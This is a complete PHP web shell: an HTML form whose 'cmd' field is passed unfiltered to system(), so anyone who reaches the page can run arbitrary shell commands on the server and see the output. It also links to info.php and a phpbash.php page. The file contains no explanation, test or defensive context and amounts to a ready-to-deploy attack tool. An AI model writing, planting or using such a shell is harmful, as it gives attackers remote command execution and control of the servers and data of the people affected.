<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
  <br>
  <a href="./info.php" >Info</a>
  <br>
  <a href="./phpbash.php" >phpbash</a>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
